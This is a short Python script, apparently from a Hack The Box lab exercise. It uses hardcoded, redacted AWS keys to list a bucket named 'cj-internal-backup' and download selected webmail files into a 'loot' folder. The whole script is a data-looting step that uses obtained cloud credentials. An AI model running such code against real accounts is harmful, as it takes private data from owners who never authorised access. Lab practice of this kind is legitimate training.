import boto3
import os

AWS_KEY = "AKIA[REDACTED-ACCESS-KEY]"
AWS_SECRET = "[REDACTED-SECRET-KEY]"
REGION = "us-east-1"
BUCKET = "cj-internal-backup"
PREFIX = "webmail/"
OUTPUT_DIR = r"C:\HTB\13.125.104.131\loot"

try:
    s3 = boto3.client(
        's3',
        aws_access_key_id=AWS_KEY,
        aws_secret_access_key=AWS_SECRET,
        region_name=REGION
    )
    
    # 파일 목록
    response = s3.list_objects_v2(Bucket=BUCKET, Prefix=PREFIX)
    
    if 'Contents' in response:
        for obj in response['Contents']:
            key = obj['Key']
            filename = os.path.basename(key)
            
            if filename in ['f1.txt', 'f2.txt', 'f3.txt', 'f4.txt', 'f5.txt', 'aws_consolidated_20260820.txt']:
                filepath = os.path.join(OUTPUT_DIR, f"s3_{filename}")
                print(f"Downloading: {key}")
                s3.download_file(BUCKET, key, filepath)
                print(f"Saved to: {filepath}")
    
    print("\nDownload complete!")
    
except Exception as e:
    print(f"Error: {e}")
